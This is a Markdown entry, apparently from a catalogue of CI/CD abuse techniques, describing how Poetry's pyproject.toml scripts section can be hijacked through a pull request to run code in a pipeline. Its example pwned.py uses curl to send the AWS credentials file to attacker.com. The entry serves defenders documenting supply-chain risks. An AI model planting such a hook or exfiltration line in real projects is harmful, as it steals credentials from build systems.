---
layout: tool
title: poetry
tags: [cli, config-file, eval-py]
references:
- https://python-poetry.org/docs/pyproject/#scripts
files: [pyproject.toml]
---

## Living Off The Pipeline - poetry

`Poetry` is a modern tool for Python dependency management and packaging. It can be abused as a "Living Off The Pipeline" (LOTP) tool by manipulating the `pyproject.toml` file to execute malicious scripts.

### First-Order LOTP Tool

`Poetry` is a **First-Order LOTP Tool**. It provides direct Remote Code Execution (RCE) by design, as it is intended to execute user-defined scripts from its configuration file.

#### Malicious Primitive: Remote Code Execution (RCE)

The `pyproject.toml` file is the central configuration file for a Poetry project. It contains a `[tool.poetry.scripts]` section that allows developers to define command-line entry points for their application.

An attacker can add or modify a script in this section to point to a malicious function within the project's codebase. When a CI/CD pipeline executes this script via the `poetry run <script_name>` command, the attacker's payload is executed.

### Real-World Attack Scenario

1.  **Attacker's PR:** An attacker submits a pull request containing:
    *   A malicious function added to the project's source code (e.g., in `my_project/pwned.py`).
    *   A modified `pyproject.toml` file that hijacks a common script command like `test`.
        ```toml
        # pyproject.toml
        [tool.poetry.scripts]
        test = "my_project.pwned:main"
        ```
    The `my_project/pwned.py` file would contain the malicious payload:
    ```python
    # my_project/pwned.py
    import os
    def main():
        os.system("curl --data-binary @$HOME/.aws/credentials http://attacker.com/")
    ```

2.  **Vulnerable Workflow:** The pipeline contains a standard command to run the project's tests via Poetry scripts.
    ```yaml
    - name: Run tests
      run: poetry run test
    ```

3.  **Execution:**
    *   The `poetry run test` command is executed.
    *   Poetry reads the `pyproject.toml` file and finds that the `test` script points to the attacker's `pwned:main` function.
    *   Poetry executes the malicious function, leading to RCE.

This attack is dangerous because the CI/CD workflow file is benign. The malicious payload is hidden in the project's source code and triggered by a subtle change in the `pyproject.toml` configuration file.